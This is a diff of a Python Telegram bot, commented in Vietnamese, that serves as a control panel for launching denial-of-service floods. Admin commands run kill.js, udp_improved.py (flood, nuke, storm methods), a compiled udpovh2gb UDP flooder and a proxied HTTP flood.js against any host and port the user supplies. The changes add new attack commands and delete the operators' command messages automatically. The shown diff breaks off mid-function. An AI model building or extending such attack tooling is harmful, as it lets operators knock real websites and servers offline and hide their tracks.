@@ -6,6 +6,7 @@ import threading
 import logging
 import subprocess
 import sqlite3
+import platform
 from datetime import datetime, timezone
 from contextlib import contextmanager
 from dataclasses import dataclass
@@ -18,6 +19,38 @@ from telebot.apihelper import ApiException
 # ========== Config và token ==========
 
 TELEGRAM_TOKEN_FILE = 'bot_token.txt'
+
+def check_dependencies():
+    """Kiểm tra các dependencies cần thiết"""
+    missing_deps = []
+    
+    # Kiểm tra Node.js
+    try:
+        subprocess.run(['node', '--version'], capture_output=True, check=True)
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        missing_deps.append('Node.js')
+    
+    # Kiểm tra Python
+    try:
+        subprocess.run(['python', '--version'], capture_output=True, check=True)
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        try:
+            subprocess.run(['python3', '--version'], capture_output=True, check=True)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            missing_deps.append('Python')
+    
+    # Kiểm tra GCC (chỉ trên Linux/Unix)
+    if os.name != 'nt':
+        try:
+            subprocess.run(['gcc', '--version'], capture_output=True, check=True)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            missing_deps.append('GCC')
+    
+    if missing_deps:
+        logger.warning(f"⚠️ Missing dependencies: {', '.join(missing_deps)}")
+        logger.warning("Some features may not work properly.")
+    else:
+        logger.info("✅ All dependencies are available")
 
 def load_bot_token():
     try:
@@ -290,28 +323,43 @@ def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
     proc = running_tasks.get(key)
     if proc and proc.poll() is None:
         sent = bot.reply_to(message, f"❌ Tác vụ `{task_key}` đang chạy rồi.")
-        delete_messages_later(chat_id, [message.message_id, sent.message_id], delay=30)
+        auto_delete_response(chat_id, message.message_id, sent, delay=10)
         return
 
     def task():
         try:
-            proc_local = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+            # Use different approach for Windows vs Unix
+            if os.name == 'nt':  # Windows
+                proc_local = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+            else:  # Unix/Linux
+                proc_local = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
             running_tasks[key] = proc_local
-            bot.send_message(chat_id, f"✅ Bắt đầu chạy tác vụ `{task_key}`:\n`{' '.join(command_list)}`", parse_mode='Markdown')
+            start_msg = bot.send_message(chat_id, f"✅ Bắt đầu chạy tác vụ `{task_key}`:\n`{' '.join(command_list)}`", parse_mode='Markdown')
+            # Tự động xóa thông báo bắt đầu sau 15 giây
+            auto_delete_response(chat_id, message.message_id, start_msg, delay=15)
+            
             stdout, stderr = proc_local.communicate()
             output = stdout.decode(errors='ignore').strip()
             errors = stderr.decode(errors='ignore').strip()
+            
             if output:
                 if len(output) > Config.MAX_MESSAGE_LENGTH:
                     output = output[:Config.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
-                bot.send_message(chat_id, f"📢 Kết quả tác vụ `{task_key}`:\n{output}")
+                result_msg = bot.send_message(chat_id, f"📢 Kết quả tác vụ `{task_key}`:\n{output}")
+                # Tự động xóa kết quả sau 30 giây
+                auto_delete_response(chat_id, message.message_id, result_msg, delay=30)
+            
             if errors:
                 if len(errors) > Config.MAX_MESSAGE_LENGTH:
                     errors = errors[:Config.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
-                bot.send_message(chat_id, f"❗ Lỗi:\n{errors}")
+                error_msg = bot.send_message(chat_id, f"❗ Lỗi:\n{errors}")
+                # Tự động xóa lỗi sau 20 giây
+                auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
         except Exception as e:
             logger.error(f"Lỗi chạy tác vụ {task_key}: {e}")
-            bot.send_message(chat_id, f"❌ Lỗi tác vụ `{task_key}`: {e}")
+            error_msg = bot.send_message(chat_id, f"❌ Lỗi tác vụ `{task_key}`: {e}")
+            # Tự động xóa lỗi sau 20 giây
+            auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
         finally:
             running_tasks[key] = None
 
@@ -322,18 +370,22 @@ def stop_subprocess(user_id, chat_id, task_key, message):
     proc = running_tasks.get(key)
     if proc and proc.poll() is None:
         try:
-            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            if os.name == 'nt':  # Windows
+                proc.terminate()
+                proc.wait(timeout=5)  # Wait up to 5 seconds for graceful shutdown
+            else:  # Unix/Linux
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
             running_tasks[key] = None
-            sent = bot.reply_to(message, f"✅ Đã dừng tác vụ `{task_key}`.")
-            delete_messages_later(chat_id, [message.message_id, sent.message_id], delay=30)
+            sent = bot.reply_to(message, f"✅ Đã dừng tác vụ `{task_key}` thành công.")
+            auto_delete_response(chat_id, message.message_id, sent, delay=10)
             logger.info(f"User {user_id} chat {chat_id} đã dừng tác vụ {task_key}")
         except Exception as e:
             sent = bot.reply_to(message, f"❌ Lỗi khi dừng tác vụ `{task_key}`: {e}")
-            delete_messages_later(chat_id, [message.message_id, sent.message_id], delay=30)
+            auto_delete_response(chat_id, message.message_id, sent, delay=15)
             logger.error(f"Lỗi dừng tác vụ {task_key}: {e}")
     else:
         sent = bot.reply_to(message, f"ℹ️ Không có tác vụ `{task_key}` nào đang chạy.")
-        delete_messages_later(chat_id, [message.message_id, sent.message_id], delay=30)
+        auto_delete_response(chat_id, message.message_id, sent, delay=10)
 
 # ========== Tiện ích ==========
 
@@ -346,6 +398,24 @@ def delete_messages_later(chat_id, message_ids, delay=30):
             except Exception as e:
                 logger.warning(f"Cannot delete message {msg_id} in chat {chat_id}: {e}")
     threading.Timer(delay, delete_msgs).start()
+
+def delete_message_immediately(chat_id, message_id):
+    """Xóa tin nhắn ngay lập tức"""
+    try:
+        bot.delete_message(chat_id, message_id)
+        logger.debug(f"Immediately deleted message {message_id} in chat {chat_id}")
+    except Exception as e:
+        logger.warning(f"Cannot immediately delete message {message_id} in chat {chat_id}: {e}")
+
+def auto_delete_response(chat_id, message_id, response_message, delay=10):
+    """Tự động xóa tin nhắn bot trả lời sau một khoảng thời gian"""
+    def delete_response():
+        try:
+            bot.delete_message(chat_id, response_message.message_id)
+            logger.debug(f"Auto-deleted response message {response_message.message_id} in chat {chat_id}")
+        except Exception as e:
+            logger.warning(f"Cannot auto-delete response message {response_message.message_id} in chat {chat_id}: {e}")
+    threading.Timer(delay, delete_response).start()
 
 def create_menu(user_id: int) -> types.ReplyKeyboardMarkup:
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
@@ -384,11 +454,12 @@ def cmd_start(message):
         welcome = db.get_setting('welcome_message') or "Chào mừng bạn đến với Bot!"
         kb = create_menu(message.from_user.id)
         sent = bot.send_message(message.chat.id, welcome, reply_markup=kb, parse_mode='Markdown')
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        # Không tự động xóa tin nhắn start vì cần hiển thị menu
+        logger.info(f"User {message.from_user.id} started the bot")
     except Exception as e:
         logger.error(f"Error in /start: {e}")
         sent = bot.reply_to(message, "❌ Có lỗi xảy ra, vui lòng thử lại sau!")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['help'])
 @ignore_old_messages
@@ -413,20 +484,29 @@ def cmd_help(message):
                 "/admin [password] - Đăng nhập admin\n"
                 "/addadmin <user_id> - Cấp quyền admin cho người khác\n"
                 "/runkill target time rate threads [proxyfile] - Chạy kill.js\n"
-                "/runudp host port method - Chạy udp_improved.py\n"
+                "/runudp host port method - Chạy udp_improved.py\n"                
+                "/runovh host port duration threads - Chạy udpovh2gb.c\n"
+                "/runflood host time threads rate - Chạy flood.js\n"
                 "/stopkill - Dừng kill.js\n"
                 "/stopudp - Dừng udp_improved.py\n"
+                "/stopflood - Dừng flood.js\n"
                 "/scrapeproxies - Thu thập proxies\n"
                 "/stopproxies - Dừng thu thập proxies\n"
                 "/statuskill - Trạng thái kill.js\n"
                 "/statusudp - Trạng thái udp_improved.py\n"
+                "/statusflood - Trạng thái flood.js\n"
             )
-        sent = bot.send_message(message.chat.id, escape_markdown_v2(help_text), parse_mode='MarkdownV2')
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        try:
+            sent = bot.send_message(message.chat.id, escape_markdown_v2(help_text), parse_mode='MarkdownV2')
+        except Exception as e:
+            # Fallback to regular Markdown if MarkdownV2 fails
+            logger.warning(f"MarkdownV2 failed, using regular Markdown: {e}")
+            sent = bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=25)
     except Exception as e:
         logger.error(f"Error in /help: {e}")
         sent = bot.reply_to(message, "❌ Có lỗi xảy ra!")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['admin'])
 @ignore_old_messages
@@ -434,10 +514,13 @@ def cmd_help(message):
 @log_command
 def cmd_admin(message):
     try:
+        # Xóa tin nhắn lệnh admin ngay lập tức để bảo mật
+        delete_message_immediately(message.chat.id, message.message_id)
+        
         args = message.text.split(maxsplit=1)
         if len(args) != 2:
             sent = bot.send_message(message.chat.id, "⚠️ Sử dụng: /admin [password]")
-            delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
             return
         password = args[1].strip()
         correct_password = db.get_setting('admin_password')
@@ -448,50 +531,59 @@ def cmd_admin(message):
             admin_session_cache.add(message.from_user.id)
             sent = bot.send_message(message.chat.id, "✅ Đăng nhập admin thành công!", reply_markup=create_menu(message.from_user.id))
             db.log_activity(message.from_user.id, "ADMIN_LOGIN", "Success")
+            # Tự động xóa thông báo thành công sau 3 giây
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=3)
         else:
             sent = bot.send_message(message.chat.id, "❌ Mật khẩu không đúng!")
             db.log_activity(message.from_user.id, "ADMIN_LOGIN", "Failed")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+            # Tự động xóa thông báo lỗi sau 5 giây
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
     except Exception as e:
         logger.error(f"Error in /admin: {e}")
         sent = bot.reply_to(message, "❌ Có lỗi xảy ra!")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
 
 @bot.message_handler(commands=['addadmin'])
 @ignore_old_messages
 @not_banned
 @admin_required
 def cmd_addadmin(message):
+    # Xóa tin nhắn lệnh ngay lập tức để bảo mật
+    delete_message_immediately(message.chat.id, message.message_id)
+    
     args = message.text.strip().split()
     if len(args) != 2:
         sent = bot.reply_to(message, "⚠️ Cách dùng: /addadmin <user_id>\nVí dụ: /addadmin 123456789")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
         return
     try:
         new_admin_id = int(args[1])
     except ValueError:
         sent = bot.reply_to(message, "❌ User ID phải là số nguyên hợp lệ!")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
         return
     if new_admin_id == message.from_user.id:
         sent = bot.reply_to(message, "⚠️ Bạn đã là admin!")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
         return
     success = db.add_admin(new_admin_id)
     if success:
         admin_session_cache.add(new_admin_id)
         sent = bot.reply_to(message, f"✅ Đã cấp quyền admin cho user với ID: {new_admin_id}")
         db.log_activity(message.from_user.id, "ADD_ADMIN", f"Cấp admin cho user {new_admin_id}")
+        # Tự động xóa thông báo thành công sau 8 giây
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=8)
     else:
         sent = bot.reply_to(message, "❌ Lỗi khi cấp quyền admin. Vui lòng thử lại!")
-    delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['myid'])
 @ignore_old_messages
 @not_banned
 def cmd_myid(message):
     sent = bot.reply_to(message, f"🆔 **ID của bạn:** `{message.from_user.id}`\n👤 **Username:** @{message.from_user.username or 'Không có'}", parse_mode='Markdown')
-    delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+    auto_delete_response(message.chat.id, message.message_id, sent, delay=15)
+    logger.info(f"User {message.from_user.id} requested their ID")
 
 @bot.message_handler(commands=['stats'])
 @ignore_old_messages
@@ -515,11 +607,12 @@ def cmd_stats(message):
             f"⏰ Uptime: {uptime}"
         )
         sent = bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
+        logger.info(f"User {message.from_user.id} requested stats")
     except Exception as e:
         logger.error(f"Error in /stats: {e}")
         sent = bot.reply_to(message, "❌ Không thể lấy thống kê!")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['runkill'])
 @ignore_old_messages
@@ -528,13 +621,22 @@ def cmd_stats(message):
 @log_command
 def cmd_runkill(message):
     try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runkill...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
         args = message.text.split()
         if len(args) < 5 or len(args) > 6:
-            sent = bot.reply_to(message,
+            bot.edit_message_text(
                 "⚠️ Cách dùng: /runkill target time rate threads [proxyfile]\n"
                 "Ví dụ: /runkill https://example.com 60 100 4 proxies.txt\n"
-                "Nếu không nhập proxyfile, bot sẽ tự động tìm file proxies.txt")
-            delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+                "Nếu không nhập proxyfile, bot sẽ tự động tìm file proxies.txt",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
             return
         target = args[1]
         duration = args[2]
@@ -543,8 +645,10 @@ def cmd_runkill(message):
         if len(args) == 6:
             proxyfile = args[5]
             if not os.path.isfile(proxyfile):
-                sent = bot.reply_to(message, f"❌ File proxy không tồn tại: {proxyfile}")
-                delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+                bot.edit_message_text(f"❌ File proxy không tồn tại: {proxyfile}", 
+                                    chat_id=message.chat.id, 
+                                    message_id=processing_msg.message_id)
+                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
                 return
         else:
             # Tự động tìm file proxy phổ biến
@@ -555,19 +659,40 @@ def cmd_runkill(message):
                     proxyfile = f
                     break
             if proxyfile is None:
-                sent = bot.reply_to(message,
+                bot.edit_message_text(
                     "❌ Không tìm thấy file proxy mặc định (proxies.txt). "
-                    "Vui lòng cung cấp tên file proxy hoặc thêm file proxies.txt vào thư mục bot.")
-                delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+                    "Vui lòng cung cấp tên file proxy hoặc thêm file proxies.txt vào thư mục bot.",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                 return
         cmd = ['node', 'kill.js', target, duration, rate, threads, proxyfile]
         logger.info(f"Running kill.js with args: {cmd}")
+        
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            f"✅ Lệnh /runkill đã được nhận!\n"
+            f"🎯 Target: {target}\n"
+            f"⏱️ Thời gian: {duration}s\n"
+            f"📊 Rate: {rate}\n"
+            f"🧵 Threads: {threads}\n"
+            f"📁 Proxy: {proxyfile}\n\n"
+            f"🔄 Đang khởi động tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
         run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'killjs', message)
-        delete_messages_later(message.chat.id, [message.message_id])
     except Exception as e:
         logger.error(f"Error /runkill: {e}")
-        sent = bot.reply_to(message, "❌ Có lỗi trong quá trình xử lý lệnh /runkill.")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['runudp'])
 @ignore_old_messages
@@ -576,57 +701,331 @@ def cmd_runkill(message):
 @log_command
 def cmd_runudp(message):
     try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runudp...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
         args = message.text.split()
         if len(args) != 4:
-            sent = bot.reply_to(message, (
+            bot.edit_message_text(
                 "⚠️ Cách dùng: /runudp host port method\n"
                 "Phương thức: flood, nuke, mix, storm, pulse, random\n"
-                "Ví dụ: /runudp 1.2.3.4 80 flood"))
-            delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+                "Ví dụ: /runudp 1.2.3.4 80 flood",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
             return
         _, host, port, method = args
         method = method.lower()
         if method not in ['flood', 'nuke', 'mix', 'storm', 'pulse', 'random']:
-            sent = bot.reply_to(message, "❌ Phương thức không hợp lệ. Chọn một trong: flood, nuke, mix, storm, pulse, random")
-            delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+            bot.edit_message_text(
+                "❌ Phương thức không hợp lệ. Chọn một trong: flood, nuke, mix, storm, pulse, random",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
             return
-        cmd = ['python3', 'udp_improved.py', host, port, method]
+        
+        # Use different approach for Windows vs Unix
+        if os.name == 'nt':  # Windows
+            cmd = ['python', 'udp_improved.py', host, port, method]
+        else:  # Unix/Linux
+            cmd = ['python3', 'udp_improved.py', host, port, method]
+        
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            f"✅ Lệnh /runudp đã được nhận!\n"
+            f"🎯 Host: {host}\n"
+            f"🔌 Port: {port}\n"
+            f"⚡ Method: {method}\n\n"
+            f"🔄 Đang khởi động tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
         run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udp', message)
-        delete_messages_later(message.chat.id, [message.message_id])
     except Exception as e:
         logger.error(f"Error /runudp: {e}")
-        sent = bot.reply_to(message, "❌ Có lỗi trong quá trình xử lý lệnh /runudp.")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
-@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies'])
+
+@bot.message_handler(commands=['runovh'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_runovh(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runovh...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
+        args = message.text.split()
+        if len(args) != 5:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runovh host port duration threads\n"
+                "Ví dụ: /runovh 1.2.3.4 80 60 8",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        _, host, port, duration, threads = args
+
+        if not os.path.isfile('udpovh2gb'):
+            if os.name == 'nt':  # Windows
+                bot.edit_message_text(
+                    "⚠️ Compilation not supported on Windows. Please compile udpovh2gb.c manually.",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+                return
+            else:  # Unix/Linux
+                compile_cmd = ['gcc', 'udpovh2gb.c', '-o', 'udpovh2gb', '-lpthread']
+                bot.edit_message_text(
+                    "🔧 Đang compile udpovh2gb.c ...",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                compile_proc = subprocess.run(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if compile_proc.returncode != 0:
+                    bot.edit_message_text(
+                        f"❌ Lỗi compile udpovh2gb.c:\n{compile_proc.stderr.decode(errors='ignore')}",
+                        chat_id=message.chat.id,
+                        message_id=processing_msg.message_id
+                    )
+                    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+                    return
+
+        # Use different approach for Windows vs Unix
+        if os.name == 'nt':  # Windows
+            cmd = ['udpovh2gb.exe', host, port, duration, threads]  # Windows executable
+        else:  # Unix/Linux
+            cmd = ['./udpovh2gb', host, port, duration, threads]
+        
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            f"✅ Lệnh /runovh đã được nhận!\n"
+            f"🎯 Host: {host}\n"
+            f"🔌 Port: {port}\n"
+            f"⏱️ Duration: {duration}s\n"
+            f"🧵 Threads: {threads}\n\n"
+            f"🔄 Đang khởi động tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udpovh', message)
+    except Exception as e:
+        logger.error(f"Error /runovh: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['runflood'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_runflood(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runflood...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
+        # Phân tích tham số từ lệnh
+        args = message.text.split()
+        if len(args) != 5:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runflood <host> <time> <threads> <rate>",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        host = args[1]
+        time = args[2]
+        threads = args[3]
+        rate = args[4]
+
+        # Kiểm tra nếu không có proxyfile, tự động tìm file proxies.txt
+        possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
+        proxyfile = None
+        for f in possible_files:
+            if os.path.isfile(f):
+                proxyfile = f
+                break
+        
+        # Nếu không tìm thấy file proxy nào
+        if proxyfile is None:
+            bot.edit_message_text(
+                "❌ Không tìm thấy file proxy (proxies.txt, proxy.txt, proxies.lst). Vui lòng cung cấp file proxy hợp lệ.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+        
+        # Các tham số mặc định sẽ được thêm vào
+        cmd = ['node', 'flood.js', 'GET', host, time, threads, rate, proxyfile, '--query', '1', '--cookie', 'uh=good', '--http', '2', '--debug', '--full', '--winter']
+        logger.info(f"Đang chạy flood.js với các tham số: {cmd}")
+
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            f"✅ Lệnh /runflood đã được nhận!\n"
+            f"🎯 Host: {host}\n"
+            f"⏱️ Time: {time}s\n"
+            f"🧵 Threads: {threads}\n"
+            f"📊 Rate: {rate}\n"
+            f"📁 Proxy: {proxyfile}\n\n"
+            f"🔄 Đang khởi động tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+
+        # Chạy script flood.js bất đồng bộ
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'flood', message)
+
+    except Exception as e:
+        logger.error(f"Đã xảy ra lỗi trong /runflood: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['stopovh'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_stopovh(message):
+    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+    processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /stopovh...")
+    
+    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+    delete_message_immediately(message.chat.id, message.message_id)
+    
+    # Cập nhật thông báo
+    bot.edit_message_text(
+        "✅ Lệnh /stopovh đã được nhận!\n🔄 Đang dừng tác vụ udpovh...",
+        chat_id=message.chat.id,
+        message_id=processing_msg.message_id
+    )
+    
+    stop_subprocess(message.from_user.id, message.chat.id, 'udpovh', message)
+
+@bot.message_handler(commands=['statusovh'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_statusovh(message):
+    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+    processing_msg = bot.reply_to(message, "🔄 Đang kiểm tra trạng thái...")
+    
+    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+    delete_message_immediately(message.chat.id, message.message_id)
+    
+    key = (message.from_user.id, message.chat.id, 'udpovh')
+    proc = running_tasks.get(key)
+    if proc and proc.poll() is None:
+        bot.edit_message_text(
+            f"✅ Tác vụ `udpovh` đang chạy (PID {proc.pid}).",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+    else:
+        bot.edit_message_text(
+            "ℹ️ Tác vụ `udpovh` hiện không chạy.",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+
+@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood'])
 @ignore_old_messages
 @not_banned
 @admin_required
 @log_command
 def cmd_stop_task(message):
     try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh dừng tác vụ...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
         cmd = message.text.lower()
         user_id = message.from_user.id
         chat_id = message.chat.id
+        
+        task_name = ""
         if cmd.startswith('/stopkill'):
+            task_name = "killjs"
             stop_subprocess(user_id, chat_id, 'killjs', message)
         elif cmd.startswith('/stopudp'):
+            task_name = "udp"
             stop_subprocess(user_id, chat_id, 'udp', message)
         elif cmd.startswith('/stopproxies'):
+            task_name = "scrapeproxies"
             stop_subprocess(user_id, chat_id, 'scrapeproxies', message)
-        delete_messages_later(chat_id, [message.message_id])
+        elif cmd.startswith('/stopflood'):
+            task_name = "flood"
+            stop_subprocess(user_id, chat_id, 'flood', message)
+        
+        # Cập nhật thông báo
+        bot.edit_message_text(
+            f"✅ Lệnh dừng tác vụ `{task_name}` đã được nhận!\n🔄 Đang dừng tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
     except Exception as e:
         logger.error(f"Error stopping task: {e}")
-        sent = bot.reply_to(message, "❌ Lỗi khi dừng tác vụ.")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        try:
+            bot.edit_message_text(f"❌ Lỗi khi dừng tác vụ: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Lỗi khi dừng tác vụ: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
-@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies'])
+@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood'])
 @ignore_old_messages
 @not_banned
 @admin_required
 @log_command
 def cmd_status_task(message):
     try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang kiểm tra trạng thái...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
         cmd = message.text.lower()
         user_id = message.from_user.id
         chat_id = message.chat.id
@@ -636,21 +1035,40 @@ def cmd_status_task(message):
             task_key = 'udp'
         elif 'proxies' in cmd:
             task_key = 'scrapeproxies'
+        elif 'flood' in cmd:
+            task_key = 'flood'
         else:
-            sent = bot.reply_to(message, "❌ Lệnh không hợp lệ.")
